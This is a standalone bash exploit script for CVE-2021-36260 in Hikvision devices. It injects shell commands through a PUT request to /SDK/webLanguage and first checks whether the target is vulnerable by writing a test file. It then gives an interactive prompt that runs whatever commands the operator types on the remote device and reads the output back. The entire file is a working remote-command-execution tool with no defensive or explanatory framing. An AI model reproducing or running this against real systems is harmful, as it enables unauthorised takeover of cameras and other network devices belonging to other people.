#!/bin/bash

# Colors
CYAN="\033[96m"
GREEN="\033[92m"
RED="\033[91m"
RESET="\033[0m"

if [[ -z "$1" ]]; then
    echo -e "${RED}Usage: $0 <ip:port>${RESET}"
    exit 1
fi

# Ensure argument contains :
if [[ "$1" != *:* ]]; then
    echo -e "${RED}Error: You must specify in the format ip:port (e.g., 10.10.10.10:80)${RESET}"
    exit 1
fi

TARGET="$1"

# Quick vulnerability check
curl -s -m 5 -X PUT "http://$TARGET/SDK/webLanguage" \
     -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
     --data "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>\$(echo test>webLib/test)</language>" >/dev/null

check=$(curl -s "http://$TARGET/test")

if [[ "$check" != "test" ]]; then
    echo -e "${RED}[-] Target $TARGET is NOT vulnerable to CVE-2021-36260${RESET}"
    exit 1
fi

echo -e "${GREEN}[+] Target $TARGET appears vulnerable!${RESET}"
echo -e "${CYAN}Connected to Hikvision target: $TARGET${RESET}"
echo -e "${CYAN}Type commands to execute remotely. Ctrl+C to exit.${RESET}"

# Interactive shell
while true; do
    # Prompt
    read -p "$(echo -e "${CYAN}hikvision-shell>${RESET} ")" cmd

    # Skip blank input
    [[ -z "$cmd" ]] && continue

    # Local clear
    if [[ "$cmd" == "clear" ]]; then
        clear
        continue
    fi

    # Execute command remotely
    curl -s -m 5 -X PUT "http://$TARGET/SDK/webLanguage" \
         -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
         --data "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>\$($cmd > webLib/out)</language>" >/dev/null

    output=$(curl -s "http://$TARGET/out")

    if [[ -n "$output" ]]; then
        echo -e "${GREEN}${output}${RESET}"
    else
        echo -e "${RED}(no output)${RESET}"
    fi
done
